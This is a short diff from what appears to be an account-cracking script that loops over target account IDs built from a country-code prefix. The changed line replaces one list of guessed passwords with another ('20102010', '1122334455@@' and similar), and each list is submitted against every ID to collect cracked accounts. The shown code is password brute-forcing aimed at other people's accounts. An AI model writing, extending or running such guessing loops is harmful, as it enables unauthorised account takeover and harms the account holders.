@@ -67,7 +67,7 @@ class appollooop_Team3742Best:
                print_x(         '\033[1;37m\033[1m-'*45     )
                for ids in id:
                   idf=self.code+str(ids)
-                  Pwx=[self.code+str(ids),str(ids),"hama1234","zaxo1234","zaxozaxo"]
+                  Pwx=[self.code+str(ids),str(ids),"20102010","1122334455@@","11223344@@"]
                   appolloteam7izz.submit(self.cracked,idf,Pwx)
              print_x(                       ""                      )
              print_x(           '\033[1;37m\033[1m-'*45             )
@@ -110,5 +110,6 @@ XXX.main_menu()
               
                      
       
+
 
                  
